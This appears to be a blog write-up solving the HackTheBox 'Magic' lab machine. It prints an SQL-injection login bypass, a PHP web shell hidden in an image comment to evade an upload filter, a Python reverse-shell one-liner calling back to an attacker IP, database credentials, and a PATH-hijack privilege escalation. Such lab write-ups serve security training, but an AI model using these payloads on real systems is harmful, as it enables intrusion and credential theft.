---
date: 2020-08-22 23:48:05
layout: post
title: HackTheBox Magic Writeup
subtitle: Hackthebox Magic Writeup.
description: >-
  in this blog i've explained how to solve Magic machine in hackthebox
image: https://i.ibb.co/t32ZVWn/Screenshot-from-2020-08-21-22-51-38.png
optimized_image: https://i.ibb.co/t32ZVWn/Screenshot-from-2020-08-21-22-51-38.png
category: hackthebox
tags:
  - hackthebox
  - Magic
author: Ahmed Fatouh
paginate: true
---



# []()Methodology

* Nmap scan
* SQL injection lead to Auth Bypass
* File upload && filter Bypass
* Privilege Escalation 

# []() Nmap Scan

> as always, i did nmap scan to find out which servicecs was running in this machine, i found some important ports like **80 for Apache server and 22 for ssh.**

> nmap -sC -sV -Pn 10.10.10.185 -oA scan.txt 

```ruby

Nmap scan report for 10.10.10.185
Host is up (0.91s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|_  256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

### []()Checking the Web-Page

* The webpage was very simple, it had a login page which you can get from the bottom of the page.

> ![](https://i.ibb.co/5G1yhtz/webpage.png)

> here's the login the page.
>
> ![](https://i.ibb.co/0c8TLbq/loginpage.png)

### []()SQL Injection

* Since we don’t know the username or password, let’s try SQL injection in both fields. The idea here is that the PHP code in the back may look something like this:

```ruby

SELECT * FROM login WHERE username='$username' AND password='$password'

```

* If not properly sanitized, since we control the $username and $password variables, we could get the query to look like this:

```ruby

SELECT * FROM login WHERE username='' OR 1=1;' AND password='$password'

```

> To do so, we can supply **'or 1=1 --** as the username and something arbitrary. **foo as the password.**

> ![](https://i.ibb.co/FnnPTY0/bypass.png)

* and here we go, i'm in.

> ![](https://i.ibb.co/h1qRnpd/done.png)

### []() File Upload with filter Bypass && Reverse shell@Magic

> when i tried to upload php file to give me **reverse shell** it's gave me an error, let's see it.

> ![](https://i.ibb.co/Mgz9Mzg/filter.png)

* so we can upload images only. let's do some magic with exiftool.

> i will upload my reverse shell as a comment in image file. i'll inject it with [exiftool](https://github.com/exiftool/exiftool)

> PHP code: **<?php echo "<pre>"; system($_GET[cmd]); ?>**

> exiftool -Comment='<?php echo "<pre>"; system($_GET[cmd]); ?>' hello.jpg
>
> ![](https://i.ibb.co/LrmxJPG/test.png)

* nice, now let's change the name of the image to **hello.php.jpg**

* let's upload the photo now.

> ![](https://i.ibb.co/cgyvRbK/good.png)

* uploaded successfully.

* now let's navigate to : **http://10.10.10.185/images/uploads/test.php.jpg?cmd=id**

> ![](https://i.ibb.co/GFDFHYG/rev.png)

* done!, let's get a reverse shell now.

> open this: **10.10.10.185/images/uploads/test.php.jpg?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.xx.xx%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27**

* and start your nc listener.

> ![](https://i.ibb.co/8XgHXKB/shell.png)

# []()Privilege Escalation >> theseus

> let's navigate to /var/www/Magic and you will found db.php5 and this file contain the Database Credentials.

> ![](https://i.ibb.co/nD5L2cq/thesus.png)

* i tried this password to login as theseus but didn't work, so let's read another file.

* there is another file its name **dump.sql** and this file contain the password of **theseus**.

> ![](https://i.ibb.co/ynn3bLY/password.png)

* use this command : **mysqldump -utheseus -piamkingtheseus -A >> dump.sql** and this will give us the same result.

> ![](https://i.ibb.co/LxJdd7S/he.png)

* Username = **Theseus**
* Password = **Th3s3usW4sK1ng**

# []()Theseus@Magic 

* let's change the user from www-data to theses

```ruby

www-data@ubuntu:/var/www/Magic$ su theseus
su theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:/var/www/Magic$ 

```
> user flag
> 
> ![](https://i.ibb.co/kQxjQSn/flag.png)

# []()Privilege Escalation >> root

* after got a shell as theseus i uploaded the LinEnum script to do some enumeration and i found juicy info.

> ![](https://i.ibb.co/12Mp6CV/inter.png)

* here's the interesting line

> ![](https://i.ibb.co/fYqQScM/dddd.png)

> This binary is not a standard / default one that is included with Linux distributions, but it will run as root regardless of who executes it. Furthermore, since we are in the users group, we do have execution rights.

* if you type **strings /bin/sysinfo**. you will see this output.

```ruby

popen() failed!
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
free -h

```
> So we will use the PATH Variable for exploiting the Binary we will set the new PATH as /tmp dir. and then i will use the **cat** binary to read **root** files.

* You can use any binary you want among the four of them

* Hardware Info = lshw -short
* Disk Info = fdisk -l
* CPU Info = cat /proc/cpuinfo
* MEM Usage = free -h

* let's start

> first make a dir in tmp directory >> **mkdir /tmp/xdevo**

> then make any file like devo.txt >> **touch devo.txt** , this file will contain the output of the files which we will read.

> **echo -e '#!/bin/sh\ncat /root/root.txt >> /tmp/xdevo/devo.txt' > pwned**

> now make the **pwned** executable file >> **chmod +x pwned**

> export the PATH variable >> **export PATH=/tmp:$PATH** or we can use this command **PATH=.:$PATH /bin/sysinfo**.

* now we can read any file we want.


> root flag.
>
> ![](https://i.ibb.co/jJ2R44y/root.png)

* cheers!

 <script src="https://www.hackthebox.eu/badge/103789"></script>






